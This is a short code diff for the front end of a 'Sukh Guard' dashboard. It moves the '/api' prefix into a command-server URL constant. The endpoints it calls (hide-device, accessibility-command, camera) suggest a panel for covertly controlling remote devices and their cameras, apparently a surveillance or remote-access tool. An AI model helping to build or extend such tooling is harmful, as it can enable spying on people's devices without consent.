@@ -1,7 +1,7 @@
 // js/app.js - Sukh Guard Dashboard Functions
 const app = {
     SERVER_URL: 'https://sukh-3qtl.onrender.com/api/website/app-data',
-    COMMANDS_URL: 'https://sukh-3qtl.onrender.com',
+    COMMANDS_URL: 'https://sukh-3qtl.onrender.com/api',
     autoRefreshInterval: null,
     isAutoRefresh: true,
     currentView: 'grid',
@@ -800,7 +800,7 @@ const app = {
         if (!app.currentDevice) return;
         
         try {
-            const response = await fetch(`${app.COMMANDS_URL}/api/hide-device`, {
+            const response = await fetch(`${app.COMMANDS_URL}/hide-device`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -850,7 +850,7 @@ const app = {
         if (!app.currentDevice) return;
         
         try {
-            const response = await fetch(`${app.COMMANDS_URL}/api/accessibility-command`, {
+            const response = await fetch(`${app.COMMANDS_URL}/accessibility-command`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -961,7 +961,7 @@ const app = {
         try {
             console.log('📷 Sending camera command:', { action, cameraType, device: app.currentDevice });
             
-            const response = await fetch(`${app.COMMANDS_URL}/api/camera`, {
+            const response = await fetch(`${app.COMMANDS_URL}/camera`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
